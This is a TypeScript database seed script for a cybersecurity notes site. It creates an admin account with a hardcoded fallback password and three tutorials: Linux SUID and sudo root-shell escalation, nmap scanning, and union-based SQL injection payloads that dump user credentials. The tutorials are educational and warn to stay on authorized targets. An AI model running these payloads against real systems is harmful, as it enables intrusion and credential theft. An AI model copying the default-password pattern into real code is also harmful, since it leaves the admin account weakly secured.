import { prisma } from "../src/lib/db";
import bcrypt from "bcryptjs";

async function main() {
  console.log("Seeding cybersecurity platform database...");

  // Create default admin user
  const adminPassword = process.env.INITIAL_ADMIN_PASSWORD || "CyberSecAdmin2026!";
  const passwordHash = await bcrypt.hash(adminPassword, 10);

  const admin = await prisma.user.upsert({
    where: { email: "admin@cybersec.local" },
    update: {
      role: "ADMIN",
      name: "Lead Security Researcher",
    },
    create: {
      email: "admin@cybersec.local",
      name: "Lead Security Researcher",
      passwordHash,
      role: "ADMIN",
    },
  });

  console.log(`Admin user ready: ${admin.email}`);

  // Create standard categories
  const categoriesData = [
    {
      name: "Privilege Escalation",
      slug: "privilege-escalation",
      description: "Linux and Windows local privilege escalation, SUID exploitation, and token manipulation.",
      color: "#10b981",
    },
    {
      name: "Network & Recon",
      slug: "network-recon",
      description: "Port scanning, service enumeration, OSINT, and active directory reconnaissance.",
      color: "#06b6d4",
    },
    {
      name: "Web Security",
      slug: "web-security",
      description: "OWASP Top 10, SSRF, SQLi, IDOR, template injection, and API penetration testing.",
      color: "#f59e0b",
    },
    {
      name: "Active Directory",
      slug: "active-directory",
      description: "Kerberoasting, AS-REP roasting, BloodHound analysis, and domain compromise paths.",
      color: "#8b5cf6",
    },
  ];

  const categoryMap: Record<string, string> = {};
  for (const cat of categoriesData) {
    const record = await prisma.category.upsert({
      where: { slug: cat.slug },
      update: {},
      create: cat,
    });
    categoryMap[cat.slug] = record.id;
  }

  // Create standard tags
  const tagsData = ["linux", "privesc", "enumeration", "nmap", "recon", "web", "sqli", "ad"];
  const tagMap: Record<string, string> = {};
  for (const t of tagsData) {
    const tag = await prisma.tag.upsert({
      where: { slug: t },
      update: {},
      create: { name: t, slug: t },
    });
    tagMap[t] = tag.id;
  }

  // Seed sample rich technical cybersecurity notes
  const notes = [
    {
      title: "Linux Privilege Escalation & SUID Abuse",
      slug: "linux-privilege-escalation",
      description: "Comprehensive Linux enumeration methodology, identifying writable paths, and abusing misconfigured SUID binaries.",
      categorySlug: "privilege-escalation",
      tags: ["linux", "privesc", "enumeration"],
      contentMarkdown: `# Linux Privilege Escalation & SUID Abuse

## System Information & Initial Enumeration

Whenever an initial reverse shell or limited user access is obtained on a target machine, execute fast initial situational awareness commands.

\`\`\`bash
whoami
id
uname -a
hostname
cat /etc/os-release
\`\`\`

> **Security Warning:** Execute enumeration and privilege escalation maneuvers exclusively on authorized infrastructure or lab ranges.

## Finding Misconfigured SUID Binaries

Files with the SUID (Set User ID) bit set run with the permissions of the file owner (often root).

\`\`\`bash
find / -perm -4000 -type f 2>/dev/null
\`\`\`

### Common SUID Targets

- \`/usr/bin/find\`
- \`/usr/bin/vim\`
- \`/usr/bin/bash\`
- \`/usr/bin/nmap\`

If \`find\` has the SUID bit set, spawn a root shell directly:

\`\`\`bash
find . -exec /bin/sh -p \\; -quit
\`\`\`

## Checking Sudo Privileges

Inspect what commands the current user can execute without entering a password:

\`\`\`bash
sudo -l
\`\`\`

If \`(ALL : ALL) NOPASSWD: /usr/bin/env\` is present:

\`\`\`bash
sudo env /bin/sh
\`\`\`

## Cron Jobs & Timers Inspection

Check scheduled background tasks that run with elevated privileges:

\`\`\`bash
cat /etc/crontab
ls -la /etc/cron.*
systemctl list-timers
\`\`\`
`,
    },
    {
      title: "Comprehensive Nmap Reconnaissance Methodology",
      slug: "nmap-recon-methodology",
      description: "Systematic network scanning techniques, script engine automation, and evasion techniques for penetration testing.",
      categorySlug: "network-recon",
      tags: ["nmap", "recon"],
      contentMarkdown: `# Comprehensive Nmap Reconnaissance Methodology

## Initial Host Discovery & Fast Port Sweep

Begin with a fast initial SYN scan across all 65,535 TCP ports to pinpoint active listeners without waiting on full script evaluations.

\`\`\`bash
nmap -p- --min-rate 2000 -T4 -Pn 10.10.10.150 -oN fast_ports.txt
\`\`\`

> **Note:** Adjust \`--min-rate\` based on network reliability and intrusion detection considerations.

## Targeted Service Enumeration

Once open ports are discovered, run in-depth service detection, default scripts, and OS finger-printing:

\`\`\`bash
nmap -sC -sV -p 22,80,445,8080 10.10.10.150 -oA detailed_scan
\`\`\`

### Analyzing Results

- **Port 80/443**: Enumerate web technologies, vhosts, and directories.
- **Port 445**: Check for SMB null sessions and known vulnerabilities with \`--script "smb-vuln*"\`.

## NSE Script Scanning

Run vulnerability checks using the Nmap Scripting Engine:

\`\`\`bash
nmap --script vuln -p 80,443 10.10.10.150
\`\`\`
`,
    },
    {
      title: "SQL Injection: Union-Based Exploitation",
      slug: "sql-injection-union-attacks",
      description: "Technical guide on exploiting SQL injections using UNION operators, column balancing, and schema data extraction.",
      categorySlug: "web-security",
      tags: ["web", "sqli"],
      contentMarkdown: `# SQL Injection: Union-Based Exploitation

## Determining Column Count

When injecting into an existing query, determine the exact number of columns returned by the original SELECT statement.

\`\`\`sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
\`\`\`

Or alternatively use NULL injection:

\`\`\`sql
' UNION SELECT NULL, NULL, NULL-- -
\`\`\`

> **Important:** Keep testing until the application returns an error or alters its response, identifying the boundary.

## Extracting Database Schema Information

In MySQL / MariaDB environments, retrieve database tables and column names:

\`\`\`sql
' UNION SELECT table_schema, table_name, 3 FROM information_schema.tables WHERE table_schema=database()-- -
\`\`\`

## Dumping User Credentials

Extract usernames and password hashes:

\`\`\`sql
' UNION SELECT username, password, 3 FROM users-- -
\`\`\`
`,
    },
  ];

  for (const note of notes) {
    const doc = await prisma.document.upsert({
      where: { slug: note.slug },
      update: {
        title: note.title,
        description: note.description,
        contentMarkdown: note.contentMarkdown,
      },
      create: {
        title: note.title,
        slug: note.slug,
        description: note.description,
        contentMarkdown: note.contentMarkdown,
        status: "PUBLISHED",
        visibility: "PUBLIC",
        readingTimeMin: 2,
        categoryId: categoryMap[note.categorySlug] || null,
        authorId: admin.id,
      },
    });

    // Link tags
    for (const tagSlug of note.tags) {
      if (tagMap[tagSlug]) {
        await prisma.documentTag.upsert({
          where: {
            documentId_tagId: {
              documentId: doc.id,
              tagId: tagMap[tagSlug],
            },
          },
          update: {},
          create: {
            documentId: doc.id,
            tagId: tagMap[tagSlug],
          },
        });
      }
    }
  }

  console.log("Database seeded successfully with initial notes and categories!");
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
